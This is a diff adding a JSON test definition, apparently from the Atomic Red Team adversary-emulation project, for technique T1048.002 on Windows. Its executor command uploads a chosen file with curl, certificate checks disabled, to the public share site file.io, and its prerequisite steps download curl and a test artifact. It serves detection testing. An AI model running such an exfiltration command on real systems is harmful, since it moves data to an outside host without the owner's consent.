@@ -1,0 +1,47 @@
+{
+    "name": "Exfiltrate data HTTPS using curl windows",
+    "description": "Exfiltrate data HTTPS using curl to file share site file.io ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "#{curl_path} -k -F \"file=@#{input_file}\" https://file.io/\n",
+        "type": "Command Executor"
+    },
+    "id": "T1048.002",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
+    "source": "ART",
+    "uuid": "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0",
+    "arguments": {
+        "input_file": {
+            "description": "Test file to upload",
+            "type": "path",
+            "default": "PathToAtomicsFolder/T1048.002/src/artifact"
+        },
+        "curl_path": {
+            "description": "path to curl.exe",
+            "type": "path",
+            "default": "C:\\Windows\\System32\\Curl.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Curl must be installed on system.\n",
+            "prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-8.4.0_6-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\n"
+        },
+        {
+            "description": "#{input_file} must be exist on system.\n",
+            "prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact\" -OutFile \"#{input_file}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
